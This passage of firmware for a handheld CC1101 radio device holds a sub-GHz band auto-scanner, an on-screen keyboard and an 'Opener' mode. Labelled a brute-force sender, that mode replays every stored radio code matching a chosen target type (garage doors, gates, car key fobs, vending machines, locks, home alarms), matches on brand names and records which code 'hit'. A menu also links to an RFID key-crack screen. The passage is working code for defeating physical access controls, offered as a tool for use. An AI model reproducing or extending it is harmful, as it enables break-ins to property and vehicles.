      tft.setCursor(30, y);
      tft.printf("%d. %s", i+1, scanBands[i].label);
      if (autoScanPeaks[i] > -80) {
        tft.setTextColor(C_CYAN, C_BG);
        tft.printf("  -> %.2f MHz (%ddBm)", autoScanPeakFreq[i], autoScanPeaks[i]);
      }
      y += 16;
    }
    y += 10;

    tft.setTextSize(2);
    drawBtn(10, y, 145, 50, "SCAN ALL", C_LGRAY, C_BG);
    bool anySignal = false;
    for (int i = 0; i < 5; i++) if (autoScanPeaks[i] > -80) { anySignal = true; break; }
    drawBtn(165, y, 145, 50, "RECORD", C_LGRAY, C_BG);

    drawFooter("Finds active signals across all sub-GHz bands");
  } else {
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    tft.printf("Scanning band %d/5: %s", autoScanBand + 1, scanBands[autoScanBand].label);
    y += 30;

    int pct = ((autoScanBand) * 100) / 5;
    int barW = 280;
    int filled = (pct * barW) / 100;
    tft.drawRect(10, y, barW, 16, C_DGREEN);
    tft.fillRect(11, y+1, filled, 14, C_GREEN);
    y += 30;

    drawBtn(10, y, 145, 50, "STOP", C_LGRAY, C_BG);

    tft.setTextSize(1);
    for (int i = 0; i < 5; i++) {
      int by = 170 + i * 55;
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, by);
      tft.print(scanBands[i].label);
      tft.drawRect(20, by + 12, 260, 35, C_DGREEN);
    }
  }
}

void runAutoScan() {
  autoScanActive = true;
  ledBlue();
  memset(autoScanPeaks, -127, sizeof(autoScanPeaks));
  memset(autoScanPeakFreq, 0, sizeof(autoScanPeakFreq));

  autoScanBand = 0;
  drawAutoScan();

  if (oledOk) {
    oled.clearDisplay();
    oled.setTextColor(SSD1306_WHITE);
    oled.setTextSize(1);
    oled.setCursor(0, 0);
    oled.print(F("AUTO SCAN"));
    oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
    oled.setCursor(0, 14);
    oled.print(F("Starting..."));
    oled.display();
  }

  const int gGraphH = 35;
  bool scanRunning = true;

  while (scanRunning) {
    for (int b = 0; b < 5; b++) {
      if (digitalRead(0) == LOW) {
        delay(80);
        if (digitalRead(0) == LOW) {
          while (digitalRead(0) == LOW) delay(10);
          scanRunning = false; break;
        }
      }
      uint16_t sx, sy;
      if (tft.getTouch(&sx, &sy) && inBtn(sx, sy, 10, 115, 145, 50)) {
        scanRunning = false; break;
      }

      autoScanBand = b;
      tft.fillRect(20, 55, 280, 16, C_BG);
      tft.setTextSize(2);
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, 55);
      tft.printf("Scanning band %d/5: %s", b + 1, scanBands[b].label);

      int pct = (b * 100) / 5;
      int barW = 280;
      tft.fillRect(11, 86, barW - 2, 14, C_BG);
      int filled = (pct * barW) / 100;
      if (filled > 0) tft.fillRect(11, 86, filled, 14, C_GREEN);

      if (oledOk) {
        oled.fillRect(0, 14, 128, 50, SSD1306_BLACK);
        oled.setCursor(0, 14);
        oled.printf("Band %d/5", b + 1);
        oled.setCursor(0, 26);
        oled.print(scanBands[b].label);
        oled.display();
      }

      sendCmd("CC_SCAN,%.2f,%.2f,64", scanBands[b].start, scanBands[b].end);
      if (waitReply(5000) && strncmp(rspBuf, "SC,", 3) == 0) {
        int steps = atoi(rspBuf + 3);
        char* p = strchr(rspBuf + 3, ',');
        int8_t bestRssi = -127;
        int bestIdx = 0;
        int8_t bandRssi[64];
        memset(bandRssi, -127, sizeof(bandRssi));

        for (int i = 0; i < steps && p; i++) {
          p++;
          int8_t rssi = atoi(p);
          if (i < 64) bandRssi[i] = rssi;
          if (rssi > bestRssi) { bestRssi = rssi; bestIdx = i; }
          p = strchr(p, ',');
        }
        autoScanPeaks[b] = bestRssi;
        float step = (scanBands[b].end - scanBands[b].start) / 63.0f;
        autoScanPeakFreq[b] = scanBands[b].start + bestIdx * step;

        int gy = 170 + b * 55 + 12;
        tft.fillRect(21, gy + 1, 258, gGraphH - 2, C_BG);
        for (int i = 0; i < 64 && i < steps; i++) {
          int barH = map(constrain(bandRssi[i], -110, -30), -110, -30, 0, gGraphH - 2);
          if (barH > 0) {
            uint16_t barColor = C_GREEN;
            if (bandRssi[i] > -50) barColor = C_RED;
            else if (bandRssi[i] > -70) barColor = C_ORANGE;
            int bx = 21 + i * 4;
            tft.fillRect(bx, gy + gGraphH - 1 - barH, 3, barH, barColor);
          }
        }

        if (oledOk) {
          oled.fillRect(0, 38, 128, 26, SSD1306_BLACK);
          if (bestRssi > -80) {
            oled.setCursor(0, 38);
            oled.printf("Signal: %ddBm", bestRssi);
            oled.setCursor(0, 50);
            oled.printf("@ %.2fMHz", autoScanPeakFreq[b]);
          } else {
            oled.setCursor(0, 38);
            oled.print(F("No signal"));
          }
          oled.display();
        }
      }
    }
  }

  autoScanActive = false;
  ledFlash(ledCyan, 2, 100, 80);

  int bestBand = -1;
  int8_t bestRssi = -80;
  for (int i = 0; i < 5; i++) {
    if (autoScanPeaks[i] > bestRssi) { bestRssi = autoScanPeaks[i]; bestBand = i; }
  }
  if (bestBand >= 0) {
    char msg[64];
    snprintf(msg, sizeof(msg), "Signal at %.2f MHz (%ddBm)!", autoScanPeakFreq[bestBand], autoScanPeaks[bestBand]);
    drawFooter(msg);
    ccFreq = autoScanPeakFreq[bestBand];
  } else {
    drawFooter("No signals above threshold detected");
  }

  if (sdOk) {
    char path[48];
    int n = 1;
    do { snprintf(path, sizeof(path), "/kodi/cc/autoscan_%03d.txt", n++); } while (SD.exists(path) && n < 999);
    if (!SD.exists(path)) {
      File f = SD.open(path, FILE_WRITE);
      if (f) {
        f.printf("KODI,AUTOSCAN,1.0\nname=Auto-Scan Results\n");
        for (int i = 0; i < 5; i++) {
          f.printf("band=%s,peak_freq=%.2f,rssi=%d\n",
            scanBands[i].label, autoScanPeakFreq[i], autoScanPeaks[i]);
        }
        f.close();
      }
    }
  }
  needRedraw = true;
}

void handleAutoScan(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    autoScanActive = false;
    clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true;
    return;
  }

  if (!autoScanActive) {
    int y = 55 + 30 + (5 * 16) + 10;
    if (inBtn(tx,ty, 10,y, 145,50)) {
      clickOk();
      runAutoScan();
    }
    bool anySignal = false;
    for (int i = 0; i < 5; i++) if (autoScanPeaks[i] > -80) { anySignal = true; break; }
    if (inBtn(tx,ty, 165,y, 145,50) && anySignal) {
      clickOk();
      curScreen = SCR_RECORD;
      needRedraw = true;
    }
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: OPENER (brute-force category sender)
// ═══════════════════════════════════════════════════════════

static const char* openerCatNames[] = {"GARAGE","GATE","CAR","VEND","LOCK","HOME"};

bool openerNameMatch(const char* name, uint8_t cat) {
  char lw[32];
  int i;
  for (i = 0; name[i] && i < 31; i++) lw[i] = tolower(name[i]);
  lw[i] = '\0';
  switch (cat) {
    case 0: return strstr(lw,"garage")||strstr(lw,"chamberlain")||strstr(lw,"liftmaster")||strstr(lw,"craftsman")||strstr(lw,"genie")||strstr(lw,"wayne")||strstr(lw,"multi gar");
    case 1: return strstr(lw,"gate")||strstr(lw,"came")||strstr(lw,"nice")||strstr(lw,"bft")||strstr(lw,"faac")||strstr(lw,"hormann")||strstr(lw,"marantec")||strstr(lw,"hysec")||strstr(lw,"doorking")||strstr(lw,"linear")||strstr(lw,"slide")||strstr(lw,"swing")||strstr(lw,"barrier");
    case 2: return strstr(lw,"fob")||strstr(lw,"toyota")||strstr(lw,"honda")||strstr(lw,"ford")||strstr(lw,"gm ")||strstr(lw,"vw ")||strstr(lw,"bmw")||strstr(lw,"nissan")||strstr(lw,"hyundai")||strstr(lw,"kia")||strstr(lw,"subaru")||strstr(lw,"mazda")||strstr(lw,"mercedes")||strstr(lw,"audi")||strstr(lw,"starter");
    case 3: return strstr(lw,"vend")||strstr(lw,"mdb")||strstr(lw,"dex");
    case 4: return strstr(lw,"lock")||strstr(lw,"keypad")||strstr(lw,"comm lock");
    case 5: return strstr(lw,"smart")||strstr(lw,"light")||strstr(lw,"ceiling")||strstr(lw,"fan")||strstr(lw,"blind")||strstr(lw,"shutter")||strstr(lw,"motion")||strstr(lw,"pool")||strstr(lw,"sprinkler")||strstr(lw,"irrigation")||strstr(lw,"alarm")||strstr(lw,"smoke")||strstr(lw,"doorbell")||strstr(lw,"pet")||strstr(lw,"relay")||strstr(lw,"outlet")||strstr(lw,"plug")||strstr(lw,"honeywell")||strstr(lw,"dsc")||strstr(lw,"sensor")||strstr(lw,"ev ")||strstr(lw,"tpms")||strstr(lw,"weather");
    default: return false;
  }
}

void openerSendCurrent() {
  char cmd[256];
  char hex[128];
  for (int i = 0; i < ccPktLen && i < 61; i++) sprintf(hex + i*2, "%02X", ccPayload[i]);
  hex[ccPktLen*2] = '\0';
  const char radios[] = {'A','B','A','B'};
  ledGreen();
  for (int a = 0; a < 4; a++) {
    snprintf(cmd, sizeof(cmd), "CC_INIT,%c,%.2f,%d,%d,%d,%d,%02X,%02X",
      radios[a], ccFreq, ccMod, ccRate, ccPower, ccPktLen, ccSync1, ccSync0);
    sendAndWait(cmd, 1000);
    snprintf(cmd, sizeof(cmd), "CC_TX,%c,%s,%d,%d", radios[a], hex, ccBurstCount, ccBurstGap);
    sendAndWait(cmd, 2000);
  }
  ledFlash(ledGreen, 2, 80, 80);
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: OPENER PICK (CC1101 or RFID)
// ═══════════════════════════════════════════════════════════

void drawOpenerPick() {
  tft.fillScreen(C_BG);
  drawHeader("Opener");

  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(40, 75);
  tft.print("Select radio:");

  drawBtn(10, 120, 300, 70, "CC1101", C_LGRAY, C_BG);
  drawBtn(10, 210, 300, 70, "RFID", C_LGRAY, C_BG);

  drawFooter("CC1101 opener or RFID key crack");
}

void handleOpenerPick(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    clickBack(); curScreen = SCR_HOME; needRedraw = true;
    return;
  }
  if (inBtn(tx,ty, 10,120, 300,70)) {
    clickOk();
    prevScreen = SCR_OPENER_PICK;
    openerState = 0;
    curScreen = SCR_OPENER;
    needRedraw = true;
  }
  else if (inBtn(tx,ty, 10,210, 300,70)) {
    clickOk();
    prevScreen = SCR_OPENER_PICK;
    curScreen = SCR_RFID_CRACK;
    needRedraw = true;
  }
}

void drawOpener() {
  tft.fillScreen(C_BG);

  if (openerState == 0) {
    drawHeader("Opener");
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 58);
    tft.print("Select target type:");

    drawBtn(10,  90, 145, 52, "GARAGE", C_LGRAY, C_BG);
    drawBtn(165, 90, 145, 52, "GATE",   C_LGRAY, C_BG);
    drawBtn(10, 150, 145, 52, "CAR",    C_LGRAY, C_BG);
    drawBtn(165,150, 145, 52, "VEND",   C_LGRAY, C_BG);
    drawBtn(10, 210, 145, 52, "LOCK",   C_LGRAY, C_BG);
    drawBtn(165,210, 145, 52, "HOME",   C_LGRAY, C_BG);

    drawFooter("Sends all known codes for a category");
  }
  else if (openerState == 1) {
    drawHeader("Opener - Sending");
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(10, 58);
    tft.printf("Cat: %s", openerCatNames[openerCat]);

    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(10, 85);
    if (ccProfileName[0]) tft.print(ccProfileName);
    else tft.print("Searching...");

    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(10, 110);
    tft.printf("Freq: %.2f MHz", ccFreq);

    tft.setCursor(10, 135);
    tft.printf("Sent: %d", openerTried);

    int barW = 300;
    tft.drawRect(10, 165, barW, 16, C_DGREEN);
    int fill = (openerFileNum > 0) ? min(barW - 2, openerFileNum * (barW - 2) / 999) : 0;
    if (fill > 0) tft.fillRect(11, 166, fill, 14, C_GREEN);

    drawBtn(60, 200, 200, 55, "HIT!", C_LGRAY, C_BG);

    drawFooter("BOOT button = stop");
  }
  else if (openerState == 2) {
    drawHeader("Opener - Review");

    if (openerFileNum > 999) {
      tft.setTextSize(3);
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, 55);
      tft.print("CYCLE COMPLETE");

      tft.setTextSize(2);
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, 90);
      tft.printf("%s: %d codes sent", openerCatNames[openerCat], openerTried);

      tft.setCursor(20, 118);
      tft.print("All profiles exhausted.");
      tft.setCursor(20, 140);
      tft.print("Did it open? If so,");
      tft.setCursor(20, 162);
      tft.print("tap TEST on last code.");

      tft.drawLine(10, 185, 310, 185, C_DGREEN);

      tft.setTextSize(1);
      for (int i = 0; i < openerHistCount && i < 6; i++) {
        int ry = 192 + i * 24;
        uint16_t bg = (openerHistSel == i) ? C_DGREEN : C_PANEL;
        tft.fillRect(10, ry, 240, 22, bg);
        tft.setTextColor(C_CYAN, bg);
        tft.setCursor(14, ry + 4);
        tft.printf("%s %.1fMHz", openerHist[i].name, openerHist[i].freq);
        drawSmBtn(255, ry + 1, 55, 20, "TEST", C_LGRAY);
      }

      if (openerHistSel >= 0)
        drawBtn(10, 380, 145, 45, "CONFIRM", C_LGRAY, C_BG);
      drawBtn(165, 380, 145, 45, "RETRY", C_LGRAY, C_BG);
      drawFooter("TEST a code, CONFIRM to save, RETRY again");
    } else {
      tft.setTextSize(3);
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(50, 55);
      tft.print("STOPPED");

      tft.setTextSize(2);
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, 90);
      tft.printf("%s: %d codes sent", openerCatNames[openerCat], openerTried);

      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, 118);
      tft.print("Did one of these work?");

      tft.drawLine(10, 145, 310, 145, C_DGREEN);

      tft.setTextSize(1);
      for (int i = 0; i < openerHistCount && i < OPENER_HIST; i++) {
        int ry = 152 + i * 24;
        uint16_t bg = (openerHistSel == i) ? C_DGREEN : C_PANEL;
        tft.fillRect(10, ry, 240, 22, bg);
        tft.setTextColor(C_CYAN, bg);
        tft.setCursor(14, ry + 4);
        tft.printf("%s %.1fMHz", openerHist[i].name, openerHist[i].freq);
        drawSmBtn(255, ry + 1, 55, 20, "TEST", C_LGRAY);
      }

      if (openerHistSel >= 0)
        drawBtn(10, 380, 145, 45, "CONFIRM", C_LGRAY, C_BG);
      drawBtn(165, 380, 145, 45, "RETRY", C_LGRAY, C_BG);
      drawFooter("TEST a code, CONFIRM to save, RETRY again");
    }
  }
}

void handleOpener(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    openerRunning = false;
    openerStep = 0;
    openerSubAttempt = 0;
    openerState = 0;
    ledOff();
    clickBack(); curScreen = prevScreen; needRedraw = true;
    return;
  }

  if (openerState == 0) {
    for (int i = 0; i < 6; i++) {
      int bx = (i % 2 == 0) ? 10 : 165;
      int by = 90 + (i / 2) * 60;
      if (inBtn(tx, ty, bx, by, 145, 52)) {
        clickOk();
        openerCat = i;
        openerState = 1;
        openerRunning = true;
        openerStep = 0;
        openerFileNum = 1;
        openerTried = 0;
        openerHistCount = 0;
        openerHistSel = -1;
        ledGreen(); needRedraw = true;
        return;
      }
    }
  }
  else if (openerState == 1) {
    if (inBtn(tx, ty, 60, 200, 200, 55)) {
      clickOk();
      openerRunning = false;
      openerStep = 0;
      openerSubAttempt = 0;
      openerState = 2;
      openerHistSel = (openerHistCount > 0) ? openerHistCount - 1 : -1;
      ledFlash(ledCyan, 2, 100, 80);
      needRedraw = true;
      return;
    }
  }
  else if (openerState == 2) {
    int histBase = (openerFileNum > 999) ? 192 : 152;
    int histMax = (openerFileNum > 999) ? 6 : OPENER_HIST;
    for (int i = 0; i < openerHistCount && i < histMax; i++) {
      int ry = histBase + i * 24;
      if (inBtn(tx, ty, 10, ry, 240, 22)) {
        openerHistSel = i;
        clickNav(); needRedraw = true;
        return;
      }
      if (inBtn(tx, ty, 255, ry + 1, 55, 20)) {
        clickOk();
        char path[48];
        snprintf(path, sizeof(path), "/kodi/cc/cc_%03d.txt", openerHist[i].fileNum);
        if (sdLoadCcProfile(path)) {
          openerSendCurrent();
          tft.fillRect(10, 430, 300, 20, C_BG);
          tft.setTextSize(2);
          tft.setTextColor(C_GREEN, C_BG);
          tft.setCursor(10, 430);
          tft.printf("Sent: %s", openerHist[i].name);
          toneBeep(1500, 50);
        }
        return;
      }
    }

    if (openerHistSel >= 0 && inBtn(tx, ty, 10, 380, 145, 45)) {
      clickOk();
      char path[48];
      snprintf(path, sizeof(path), "/kodi/cc/cc_%03d.txt", openerHist[openerHistSel].fileNum);
      sdLoadCcProfile(path);
      kbInput[0] = '\0'; kbInputLen = 0;
      kbShift = false; kbPage = 0;
      kbSaveType = 1;
      kbReturnScreen = SCR_OPENER;
      curScreen = SCR_KEYBOARD;
      needRedraw = true;
      return;
    }

    if (inBtn(tx, ty, 165, 380, 145, 45)) {
      clickOk();
      openerState = 1;
      openerRunning = true;
      openerStep = 0;
      openerFileNum = 1;
      openerTried = 0;
      openerHistCount = 0;
      openerHistSel = -1;
      ledGreen(); needRedraw = true;
      return;
    }
  }
}

void openerFinish() {
  openerRunning = false;
  openerState = 2;
  openerStep = 0;
  openerSubAttempt = 0;
  openerHistSel = -1;
  needRedraw = true;
  ledFlash(ledCyan, 3, 150, 100);
  toneBeep(800, 200);
}

void openerAddHist() {
  if (openerHistCount < OPENER_HIST) {
    OpenerHist& h = openerHist[openerHistCount++];
    h.fileNum = openerFileNum;
    strncpy(h.name, ccProfileName, 23); h.name[23] = '\0';
    h.freq = ccFreq;
  } else {
    for (int i = 0; i < OPENER_HIST - 1; i++) openerHist[i] = openerHist[i+1];
    OpenerHist& h = openerHist[OPENER_HIST - 1];
    h.fileNum = openerFileNum;
    strncpy(h.name, ccProfileName, 23); h.name[23] = '\0';
    h.freq = ccFreq;
  }
}

void updateOpener() {
  if (!openerRunning || curScreen != SCR_OPENER) return;

  if (digitalRead(0) == LOW) {
    delay(80);
    if (digitalRead(0) == LOW) {
      while (digitalRead(0) == LOW) delay(10);
      openerRunning = false;
      openerState = 2;
      openerStep = 0;
      openerSubAttempt = 0;
      openerHistSel = -1;
      ledFlash(ledCyan, 2, 100, 80);
      needRedraw = true;
      return;
    }
  }

  switch (openerStep) {
    case 0: {
      if (millis() - lastOpenerSend < 400) return;
      int skips = 0;
      while (openerFileNum <= 999 && skips < 10) {
        char path[48];
        snprintf(path, sizeof(path), "/kodi/cc/cc_%03d.txt", openerFileNum);
        if (!SD.exists(path)) {
          openerFileNum++; skips++;
          if (openerFileNum > 999) { openerFinish(); return; }
          continue;
        }
        if (!sdLoadCcProfile(path)) { openerFileNum++; skips++; continue; }
        if (!openerNameMatch(ccProfileName, openerCat)) { openerFileNum++; skips++; continue; }
        openerSubAttempt = 0;
        sendCmd("CC_INIT,%c,%.2f,%d,%d,%d,%d,%02X,%02X",
          'A', ccFreq, ccMod, ccRate, ccPower, ccPktLen, ccSync1, ccSync0);
        openerStep = 1;
        openerStepTime = millis();
        return;
      }
      if (openerFileNum > 999) openerFinish();
      break;
    }
    case 1: {
      if (espMsgAvail()) {
        const char* msg = espMsgRead();
        if (msg[0] == '!') { handleAsync(msg); return; }
        char hex[128];
        for (int i = 0; i < ccPktLen && i < 61; i++) sprintf(hex + i*2, "%02X", ccPayload[i]);
        hex[ccPktLen*2] = '\0';
        char txR = (openerSubAttempt & 1) ? 'B' : 'A';
        sendCmd("CC_TX,%c,%s,%d,%d", txR, hex, ccBurstCount, ccBurstGap);
        openerStep = 2;
        openerStepTime = millis();
        return;
      }
      if (millis() - openerStepTime > 1000) {
        openerFileNum++;
        openerStep = 0;
      }
      break;
    }
    case 2: {
      bool txDone = false;
      if (espMsgAvail()) {
        const char* msg = espMsgRead();
        if (msg[0] == '!') { handleAsync(msg); return; }
        txDone = true;
      } else if (millis() - openerStepTime > 3000) {
        txDone = true;
      }
      if (txDone) {
        openerSubAttempt++;
        if (openerSubAttempt < 4) {
          char r = (openerSubAttempt & 1) ? 'B' : 'A';
          sendCmd("CC_INIT,%c,%.2f,%d,%d,%d,%d,%02X,%02X",
            r, ccFreq, ccMod, ccRate, ccPower, ccPktLen, ccSync1, ccSync0);
          openerStep = 1;
          openerStepTime = millis();
        } else {
          openerTried++;
          openerAddHist();
          openerFileNum++;
          lastOpenerSend = millis();
          openerStep = 0;
          needRedraw = true;
        }
      }
      break;
    }
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: ON-SCREEN QWERTY KEYBOARD
//  Based on TFT_eSPI_Button from Bodmer Keypad_480x320 example
// ═══════════════════════════════════════════════════════════

static const char* kbGetRow(int row) {
  if (kbPage == 2) {
    if (row == 0) return kbRows0N;
    if (row == 1) return kbRows1N;
    return kbRows2N;
  }
  if (kbShift) {
    if (row == 0) return kbRows0U;
    if (row == 1) return kbRows1U;
    return kbRows2U;
  }
  if (row == 0) return kbRows0;
  if (row == 1) return kbRows1;
  return kbRows2;
}

void drawKeyboard() {
  tft.fillScreen(C_BG);
  drawHeader("Name This Save");

  // Input field
  tft.fillRoundRect(10, 54, 300, 32, 6, C_PANEL);
  tft.drawRoundRect(10, 54, 300, 32, 6, C_GREEN);
  tft.setTextColor(C_WHITE, C_PANEL);
  tft.setTextSize(2);
  tft.setCursor(16, 60);
  if (kbInputLen > 0) tft.print(kbInput);
  else { tft.setTextColor(C_LGRAY, C_PANEL); tft.print("Tap keys or SKIP"); }

  // Cursor blink indicator
  if (kbInputLen > 0 && kbInputLen < KB_MAX_INPUT) {
    int cx = 16 + kbInputLen * 12;
    tft.fillRect(cx, 61, 2, 18, C_GREEN);
  }

  // Key dimensions for 320-wide portrait screen
  int keyW = 28, keyH = 34, gapX = 3, gapY = 4;
  int startY = 92;

  // Row 0: 10 keys
  const char* r0 = kbGetRow(0);
  int r0Len = strlen(r0);
  int r0Start = (320 - r0Len * (keyW + gapX)) / 2;
  for (int i = 0; i < r0Len; i++) {
    int x = r0Start + i * (keyW + gapX);
    tft.fillRoundRect(x, startY, keyW, keyH, 4, C_DGRAY);
    tft.drawRoundRect(x, startY, keyW, keyH, 4, C_DGREEN);
    tft.setTextColor(C_WHITE, C_DGRAY);
    tft.setTextSize(2);
    tft.setCursor(x + (keyW - 12) / 2, startY + (keyH - 14) / 2);
    tft.print(r0[i]);
  }

  // Row 1: 9 keys (or 10 for numbers)
  int r1Y = startY + keyH + gapY;
  const char* r1 = kbGetRow(1);
  int r1Len = strlen(r1);
  int r1Start = (320 - r1Len * (keyW + gapX)) / 2;
  for (int i = 0; i < r1Len; i++) {
    int x = r1Start + i * (keyW + gapX);
    tft.fillRoundRect(x, r1Y, keyW, keyH, 4, C_DGRAY);
    tft.drawRoundRect(x, r1Y, keyW, keyH, 4, C_DGREEN);
    tft.setTextColor(C_WHITE, C_DGRAY);
    tft.setTextSize(2);
    tft.setCursor(x + (keyW - 12) / 2, r1Y + (keyH - 14) / 2);
    tft.print(r1[i]);
  }

  // Row 2: 7 keys (or 5) + SHIFT + BKSP
  int r2Y = r1Y + keyH + gapY;
  const char* r2 = kbGetRow(2);
  int r2Len = strlen(r2);
  // Shift button
  int shiftW = 40;
  tft.fillRoundRect(5, r2Y, shiftW, keyH, 4, kbShift ? C_DGREEN : C_DGRAY);
  tft.drawRoundRect(5, r2Y, shiftW, keyH, 4, C_GREEN);
  tft.setTextColor(C_WHITE, kbShift ? C_DGREEN : C_DGRAY);
  tft.setTextSize(1);
  tft.setCursor(10, r2Y + 12);
  tft.print("SHIFT");

  int r2Start = 5 + shiftW + gapX;
  for (int i = 0; i < r2Len; i++) {
    int x = r2Start + i * (keyW + gapX);
    tft.fillRoundRect(x, r2Y, keyW, keyH, 4, C_DGRAY);
    tft.drawRoundRect(x, r2Y, keyW, keyH, 4, C_DGREEN);
    tft.setTextColor(C_WHITE, C_DGRAY);
    tft.setTextSize(2);
    tft.setCursor(x + (keyW - 12) / 2, r2Y + (keyH - 14) / 2);
    tft.print(r2[i]);
  }

  // Backspace button
  int bkspX = r2Start + r2Len * (keyW + gapX) + gapX;
  int bkspW = 320 - bkspX - 5;
  tft.fillRoundRect(bkspX, r2Y, bkspW, keyH, 4, 0x3800);
  tft.drawRoundRect(bkspX, r2Y, bkspW, keyH, 4, C_RED);
  tft.setTextColor(C_WHITE, 0x3800);
  tft.setTextSize(1);
  tft.setCursor(bkspX + 8, r2Y + 12);
  tft.print("BKSP");

  // Row 3: 123/ABC, SPACE, DONE, SKIP
  int r3Y = r2Y + keyH + gapY;
  // 123/ABC toggle
  tft.fillRoundRect(5, r3Y, 40, keyH, 4, C_PANEL);
  tft.drawRoundRect(5, r3Y, 40, keyH, 4, C_GREEN);
  tft.setTextColor(C_WHITE, C_PANEL);
  tft.setTextSize(1);
  tft.setCursor(12, r3Y + 12);
  tft.print(kbPage == 2 ? "ABC" : "123");

  // Space bar
  tft.fillRoundRect(48, r3Y, 100, keyH, 4, C_DGRAY);
  tft.drawRoundRect(48, r3Y, 100, keyH, 4, C_DGREEN);
  tft.setTextColor(C_LGRAY, C_DGRAY);
  tft.setTextSize(1);
  tft.setCursor(78, r3Y + 12);
  tft.print("SPACE");

  // DONE button
  tft.fillRoundRect(151, r3Y, 70, keyH, 4, C_DGREEN);
  tft.drawRoundRect(151, r3Y, 70, keyH, 4, C_GREEN);
  tft.setTextColor(C_WHITE, C_DGREEN);
  tft.setTextSize(2);
  tft.setCursor(157, r3Y + 10);
  tft.print("DONE");

  // SKIP button
  tft.fillRoundRect(224, r3Y, 90, keyH, 4, C_PANEL);
  tft.drawRoundRect(224, r3Y, 90, keyH, 4, C_ORANGE);
  tft.setTextColor(C_ORANGE, C_PANEL);
  tft.setTextSize(2);
  tft.setCursor(242, r3Y + 10);
  tft.print("SKIP");
}

void kbFinish(bool skipped) {
  if (kbSaveType == 0) {
    sdSaveRfidNamed(skipped ? "" : kbInput);
    drawFooter("Saved to SD!");
  }
  else if (kbSaveType == 1) {
    if (!skipped && kbInput[0]) strncpy(ccProfileName, kbInput, 31);
    sdSaveCcProfile();
    drawFooter("Profile saved!");
  }
  kbInputLen = 0;
  kbInput[0] = '\0';
  kbShift = false;
  kbPage = 0;
  curScreen = kbReturnScreen;
  needRedraw = true;
  clickOk();
}

void handleKeyboard(int tx, int ty) {
  // BACK button
  if (inBtn(tx, ty, 224, 3, 92, 44)) {
    kbInputLen = 0; kbInput[0] = '\0';
    kbShift = false; kbPage = 0;
    clickBack(); curScreen = kbReturnScreen; needRedraw = true;
    return;
  }

  int keyW = 28, keyH = 34, gapX = 3, gapY = 4;
  int startY = 92;

  // Row 0
  const char* r0 = kbGetRow(0);
  int r0Len = strlen(r0);
  int r0Start = (320 - r0Len * (keyW + gapX)) / 2;
  for (int i = 0; i < r0Len; i++) {
    int x = r0Start + i * (keyW + gapX);
    if (inBtn(tx, ty, x, startY, keyW, keyH)) {
      if (kbInputLen < KB_MAX_INPUT) {
        kbInput[kbInputLen++] = r0[i];
        kbInput[kbInputLen] = '\0';
        if (kbShift) { kbShift = false; }
      }
      clickNav(); needRedraw = true; return;
    }
  }

  // Row 1
  int r1Y = startY + keyH + gapY;
  const char* r1 = kbGetRow(1);
  int r1Len = strlen(r1);
  int r1Start = (320 - r1Len * (keyW + gapX)) / 2;
  for (int i = 0; i < r1Len; i++) {
    int x = r1Start + i * (keyW + gapX);
    if (inBtn(tx, ty, x, r1Y, keyW, keyH)) {
      if (kbInputLen < KB_MAX_INPUT) {
        kbInput[kbInputLen++] = r1[i];
        kbInput[kbInputLen] = '\0';
        if (kbShift) { kbShift = false; }
      }
      clickNav(); needRedraw = true; return;
    }
  }

  // Row 2: shift + letters + bksp
  int r2Y = r1Y + keyH + gapY;
  const char* r2 = kbGetRow(2);
  int r2Len = strlen(r2);
  int shiftW = 40;

  // Shift
  if (inBtn(tx, ty, 5, r2Y, shiftW, keyH)) {
    kbShift = !kbShift;
    clickNav(); needRedraw = true; return;
  }

  int r2Start = 5 + shiftW + gapX;
  for (int i = 0; i < r2Len; i++) {
    int x = r2Start + i * (keyW + gapX);
    if (inBtn(tx, ty, x, r2Y, keyW, keyH)) {
      if (kbInputLen < KB_MAX_INPUT) {
        kbInput[kbInputLen++] = r2[i];
        kbInput[kbInputLen] = '\0';
        if (kbShift) { kbShift = false; }
      }
      clickNav(); needRedraw = true; return;
    }
  }

  // Backspace
  int bkspX = r2Start + r2Len * (keyW + gapX) + gapX;
  int bkspW = 320 - bkspX - 5;
  if (inBtn(tx, ty, bkspX, r2Y, bkspW, keyH)) {
    if (kbInputLen > 0) { kbInput[--kbInputLen] = '\0'; }
    clickBack(); needRedraw = true; return;
  }

  // Row 3: 123/ABC, space, DONE, SKIP
  int r3Y = r2Y + keyH + gapY;

  // 123/ABC toggle
  if (inBtn(tx, ty, 5, r3Y, 40, keyH)) {
    kbPage = (kbPage == 2) ? 0 : 2;
    clickNav(); needRedraw = true; return;
  }

  // Space
  if (inBtn(tx, ty, 48, r3Y, 100, keyH)) {
    if (kbInputLen < KB_MAX_INPUT) {
      kbInput[kbInputLen++] = ' ';
      kbInput[kbInputLen] = '\0';
    }
    clickNav(); needRedraw = true; return;
  }

  // DONE
  if (inBtn(tx, ty, 151, r3Y, 70, keyH)) {
    kbFinish(false);
    return;
  }

  // SKIP
  if (inBtn(tx, ty, 224, r3Y, 90, keyH)) {
    kbFinish(true);
    return;
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: PAYLOAD MANAGER (Saved Signals)
// ═══════════════════════════════════════════════════════════

static const char* tabLabels[] = {"CC1101", "REC", "RFID", "WIFI", "NEURAL"};
